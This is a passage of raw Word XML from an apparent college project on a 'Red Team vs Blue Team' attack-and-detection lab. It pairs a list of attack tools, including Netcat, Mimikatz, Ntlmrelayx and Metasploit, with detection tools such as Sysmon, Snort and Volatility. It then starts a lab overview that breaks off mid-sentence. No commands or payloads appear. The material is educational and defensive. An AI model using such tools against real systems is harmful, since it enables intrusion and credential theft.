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2EF5" w:rsidRDefault="00143BE4" w:rsidP="00143BE4">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">  </w:t>
      </w:r>
      <w:r w:rsidRPr="00143BE4">
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="FF0000"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Red Team</w:t>
      </w:r>
      <w:r w:rsidRPr="00143BE4">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Vs</w:t>
      </w:r>
      <w:r w:rsidRPr="00143BE4">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t>Blue Team</w:t>
      </w:r>
      <w:r w:rsidRPr="00143BE4">
        <w:rPr>
          <w:sz w:val="48"/>
          <w:szCs w:val="48"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00143BE4" w:rsidRPr="00944C35" w:rsidRDefault="005C2EF5" w:rsidP="00143BE4">
      <w:pPr>
        <w:pStyle w:val="IntenseQuote"/>
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00944C35">
        <w:rPr>
          <w:b/>
          <w:bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t>Attack &amp; Detection Lab</w:t>
      </w:r>
      <w:r w:rsidR="00143BE4" w:rsidRPr="00944C35">
        <w:rPr>
          <w:sz w:val="36"/>
          <w:szCs w:val="36"/>
        </w:rPr>
        <w:t xml:space="preserve">                              </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00143BE4" w:rsidRDefault="00852D0C" w:rsidP="00143BE4">
      <w:pPr>
        <w:pStyle w:val="Heading2"/>
        <w:rPr>
          <w:rFonts w:ascii="Algerian" w:hAnsi="Algerian"/>
          <w:sz w:val="44"/>
          <w:szCs w:val="44"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="40E9766E" wp14:editId="57712B42">
            <wp:extent cx="5486400" cy="3507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507105"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="4315"/>
        <w:gridCol w:w="4315"/>
      </w:tblGrid>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRPr="00F60B26" w:rsidRDefault="00F60B26">
            <w:pPr>
              <w:rPr>
                <w:color w:val="FF0000"/>
                <w:rPrChange w:id="0" w:author="משתמש" w:date="2020-10-31T23:59:00Z">
                  <w:rPr/>
                </w:rPrChange>
              </w:rPr>
              <w:pPrChange w:id="1" w:author="משתמש" w:date="2020-10-31T23:58:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:ins w:id="2" w:author="משתמש" w:date="2020-10-31T23:58:00Z">
              <w:r w:rsidRPr="00F60B26">
                <w:rPr>
                  <w:color w:val="FF0000"/>
                  <w:rPrChange w:id="3" w:author="משתמש" w:date="2020-10-31T23:59:00Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:t xml:space="preserve">Attacking </w:t>
              </w:r>
            </w:ins>
            <w:ins w:id="4" w:author="משתמש" w:date="2020-10-31T23:59:00Z">
              <w:r w:rsidRPr="00F60B26">
                <w:rPr>
                  <w:color w:val="FF0000"/>
                  <w:rPrChange w:id="5" w:author="משתמש" w:date="2020-10-31T23:59:00Z">
                    <w:rPr/>
                  </w:rPrChange>
                </w:rPr>
                <w:t xml:space="preserve">tools and techniques </w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="00F60B26">
            <w:pPr>
              <w:pPrChange w:id="6" w:author="משתמש" w:date="2020-10-31T23:59:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:r w:rsidRPr="00F60B26">
              <w:rPr>
                <w:color w:val="00B0F0"/>
                <w:rPrChange w:id="7" w:author="משתמש" w:date="2020-10-31T23:59:00Z">
                  <w:rPr/>
                </w:rPrChange>
              </w:rPr>
              <w:t>Detection tools and techniques</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="0096643F">
            <w:pPr>
              <w:pPrChange w:id="8" w:author="משתמש" w:date="2020-11-01T00:01:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="9" w:author="משתמש" w:date="2020-11-01T00:01:00Z">
              <w:r>
                <w:t>Nmap</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRPr="00F60B26" w:rsidRDefault="00F60B26">
            <w:pPr>
              <w:rPr>
                <w:color w:val="000000" w:themeColor="text1"/>
                <w:rPrChange w:id="10" w:author="משתמש" w:date="2020-11-01T00:00:00Z">
                  <w:rPr/>
                </w:rPrChange>
              </w:rPr>
              <w:pPrChange w:id="11" w:author="משתמש" w:date="2020-11-01T00:00:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="12" w:author="משתמש" w:date="2020-11-01T00:00:00Z">
              <w:r>
                <w:rPr>
                  <w:color w:val="000000" w:themeColor="text1"/>
                </w:rPr>
                <w:t>Winlogbeat+sysmon</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="0096643F" w:rsidP="00441736">
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="13" w:author="משתמש" w:date="2020-11-01T00:02:00Z">
              <w:r>
                <w:t>Dirb</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:t>(</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:t>DirBuster</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:t>)</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="00F60B26" w:rsidP="00441736">
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="14" w:author="משתמש" w:date="2020-11-01T00:01:00Z">
              <w:r>
                <w:t>Packetbeat</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="0096643F">
            <w:pPr>
              <w:pPrChange w:id="15" w:author="משתמש" w:date="2020-11-01T00:02:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="16" w:author="משתמש" w:date="2020-11-01T00:02:00Z">
              <w:r>
                <w:t>Sqlmap</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="00F60B26">
            <w:pPr>
              <w:pPrChange w:id="17" w:author="משתמש" w:date="2020-11-01T00:01:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="18" w:author="משתמש" w:date="2020-11-01T00:01:00Z">
              <w:r>
                <w:t>Auditbeat</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="0096643F" w:rsidP="00441736">
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="19" w:author="משתמש" w:date="2020-11-01T00:03:00Z">
              <w:r>
                <w:t>Netcat</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="00F60B26" w:rsidP="00441736">
            <w:ins w:id="20" w:author="משתמש" w:date="2020-11-01T00:01:00Z">
              <w:r>
                <w:t>Snort</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="0096643F">
            <w:pPr>
              <w:pPrChange w:id="21" w:author="משתמש" w:date="2020-11-01T00:03:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="22" w:author="משתמש" w:date="2020-11-01T00:03:00Z">
              <w:r>
                <w:t>LinEnum</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="00441736">
            <w:pPr>
              <w:pPrChange w:id="23" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="24" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
              <w:r>
                <w:t>WinPmem</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="0096643F">
            <w:pPr>
              <w:pPrChange w:id="25" w:author="משתמש" w:date="2020-11-01T00:04:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:ins w:id="26" w:author="משתמש" w:date="2020-11-01T00:04:00Z">
              <w:r>
                <w:t xml:space="preserve">Python </w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:t>SimpleHttpserver</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="00441736">
            <w:pPr>
              <w:pPrChange w:id="27" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:ins w:id="28" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
              <w:r>
                <w:t>Volatility</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00F60B26" w:rsidTr="00F60B26">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="0096643F">
            <w:pPr>
              <w:pPrChange w:id="29" w:author="משתמש" w:date="2020-11-01T00:05:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:ins w:id="30" w:author="משתמש" w:date="2020-11-01T00:05:00Z">
              <w:r>
                <w:t>MITM6</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="00F60B26" w:rsidRDefault="00441736">
            <w:pPr>
              <w:pPrChange w:id="31" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="32" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
              <w:r>
                <w:t>Pestudio</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096643F" w:rsidTr="0096643F">
        <w:trPr>
          <w:ins w:id="33" w:author="משתמש" w:date="2020-11-01T00:05:00Z"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="0096643F" w:rsidP="00807E0F">
            <w:pPr>
              <w:rPr>
                <w:ins w:id="34" w:author="משתמש" w:date="2020-11-01T00:05:00Z"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="35" w:author="משתמש" w:date="2020-11-01T00:06:00Z">
              <w:r>
                <w:t>Ntlmrelayx</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:t>(</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:t>Impacket</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:t>)</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="00441736">
            <w:pPr>
              <w:rPr>
                <w:ins w:id="36" w:author="משתמש" w:date="2020-11-01T00:05:00Z"/>
              </w:rPr>
              <w:pPrChange w:id="37" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="38" w:author="משתמש" w:date="2020-11-01T00:12:00Z">
              <w:r>
                <w:t>Noriben</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096643F" w:rsidTr="0096643F">
        <w:trPr>
          <w:ins w:id="39" w:author="משתמש" w:date="2020-11-01T00:05:00Z"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="0096643F" w:rsidP="00807E0F">
            <w:pPr>
              <w:rPr>
                <w:ins w:id="40" w:author="משתמש" w:date="2020-11-01T00:05:00Z"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="41" w:author="משתמש" w:date="2020-11-01T00:07:00Z">
              <w:r>
                <w:t>Psexec</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:t>(</w:t>
              </w:r>
              <w:proofErr w:type="spellStart"/>
              <w:r>
                <w:t>Impacket</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:t>)</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="00441736">
            <w:pPr>
              <w:rPr>
                <w:ins w:id="42" w:author="משתמש" w:date="2020-11-01T00:05:00Z"/>
              </w:rPr>
              <w:pPrChange w:id="43" w:author="משתמש" w:date="2020-11-01T00:13:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="44" w:author="משתמש" w:date="2020-11-01T00:13:00Z">
              <w:r>
                <w:t>Tcp</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
              <w:r>
                <w:t>-View</w:t>
              </w:r>
            </w:ins>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096643F" w:rsidTr="0096643F">
        <w:trPr>
          <w:ins w:id="45" w:author="משתמש" w:date="2020-11-01T00:07:00Z"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="0096643F" w:rsidP="00807E0F">
            <w:pPr>
              <w:rPr>
                <w:ins w:id="46" w:author="משתמש" w:date="2020-11-01T00:07:00Z"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="47" w:author="משתמש" w:date="2020-11-01T00:07:00Z">
              <w:r>
                <w:t>Smbclient</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
            </w:ins>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRPr="00F15DAC" w:rsidRDefault="00F15DAC" w:rsidP="00F15DAC">
            <w:pPr>
              <w:pStyle w:val="Heading1"/>
              <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
              <w:spacing w:before="0"/>
              <w:rPr>
                <w:ins w:id="48" w:author="משתמש" w:date="2020-11-01T00:07:00Z"/>
                <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
                <w:color w:val="171717"/>
                <w:sz w:val="22"/>
                <w:szCs w:val="22"/>
                <w:rPrChange w:id="49" w:author="משתמש" w:date="2020-11-03T17:38:00Z">
                  <w:rPr>
                    <w:ins w:id="50" w:author="משתמש" w:date="2020-11-01T00:07:00Z"/>
                  </w:rPr>
                </w:rPrChange>
              </w:rPr>
              <w:pPrChange w:id="51" w:author="משתמש" w:date="2020-11-03T17:37:00Z">
                <w:pPr>
                  <w:jc w:val="center"/>
                </w:pPr>
              </w:pPrChange>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="52" w:author="משתמש" w:date="2020-11-03T17:38:00Z">
              <w:r>
                <w:rPr>
                  <w:rFonts w:asciiTheme="minorHAnsi" w:hAnsiTheme="minorHAnsi" w:cstheme="minorHAnsi"/>
                  <w:color w:val="171717"/>
                  <w:sz w:val="22"/>
                  <w:szCs w:val="22"/>
                </w:rPr>
                <w:t>Sysinternals</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096643F" w:rsidTr="0096643F">
        <w:trPr>
          <w:ins w:id="53" w:author="משתמש" w:date="2020-11-01T00:07:00Z"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="0096643F" w:rsidP="00807E0F">
            <w:pPr>
              <w:rPr>
                <w:ins w:id="54" w:author="משתמש" w:date="2020-11-01T00:07:00Z"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="55" w:author="משתמש" w:date="2020-11-01T00:09:00Z">
              <w:r>
                <w:t>Mimikatz</w:t>
              </w:r>
            </w:ins>
            <w:proofErr w:type="spellEnd"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="0096643F" w:rsidP="00807E0F">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:ins w:id="56" w:author="משתמש" w:date="2020-11-01T00:07:00Z"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="0096643F" w:rsidTr="0096643F">
        <w:trPr>
          <w:ins w:id="57" w:author="משתמש" w:date="2020-11-01T00:11:00Z"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="0096643F" w:rsidP="00807E0F">
            <w:pPr>
              <w:rPr>
                <w:ins w:id="58" w:author="משתמש" w:date="2020-11-01T00:11:00Z"/>
              </w:rPr>
            </w:pPr>
            <w:proofErr w:type="spellStart"/>
            <w:ins w:id="59" w:author="משתמש" w:date="2020-11-01T00:11:00Z">
              <w:r>
                <w:t>Metasploit</w:t>
              </w:r>
              <w:proofErr w:type="spellEnd"/>
            </w:ins>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4315" w:type="dxa"/>
          </w:tcPr>
          <w:p w:rsidR="0096643F" w:rsidRDefault="0096643F" w:rsidP="00807E0F">
            <w:pPr>
              <w:jc w:val="center"/>
              <w:rPr>
                <w:ins w:id="60" w:author="משתמש" w:date="2020-11-01T00:11:00Z"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>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6D549E" w:rsidRPr="006D549E" w:rsidRDefault="00CB5870" w:rsidP="00944C35">
      <w:pPr>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Over</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>v</w:t>
      </w:r>
      <w:r w:rsidRPr="00CB5870">
        <w:rPr>
          <w:color w:val="0070C0"/>
          <w:sz w:val="72"/>
          <w:szCs w:val="72"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>iew</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00536E41" w:rsidRDefault="00536E41">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>I have created t</w:t>
      </w:r>
      <w:r w:rsidR="00D0399B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">his virtual lab </w:t>
      </w:r>
      <w:r w:rsidR="00D0399B" w:rsidRPr="00D0399B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>environment</w:t>
      </w:r>
      <w:r w:rsidR="00D0399B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">as </w:t>
      </w:r>
      <w:r w:rsidR="00D0399B">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>part of my college project.</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00996884" w:rsidRDefault="00D0399B">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">In this lab I </w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">will </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>focus on red team and blue team techniques that can be use</w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">d as part of </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">real cyber-attacks or </w:t>
      </w:r>
      <w:r w:rsidR="005C2EF5">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">while </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>conducting penetration test.</w:t>
      </w:r>
      <w:bookmarkStart w:id="61" w:name="_GoBack"/>
      <w:bookmarkEnd w:id="61"/>
    </w:p>
    <w:p w:rsidR="00F17D28" w:rsidRDefault="003F13A9">
      <w:pPr>
        <w:tabs>
          <w:tab w:val="left" w:pos="253"/>
          <w:tab w:val="center" w:pos="4320"/>
        </w:tabs>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t>The lab installed and tested on Virtual-Box and simulates a small</w:t>
      </w:r>
      <w:r w:rsidR="001B455C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">sized </w:t>
      </w:r>
      <w:r w:rsidR="001B455C">
        <w:rPr>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
        </w:rPr>
        <w:t xml:space="preserve">company </w:t>
      </w:r>
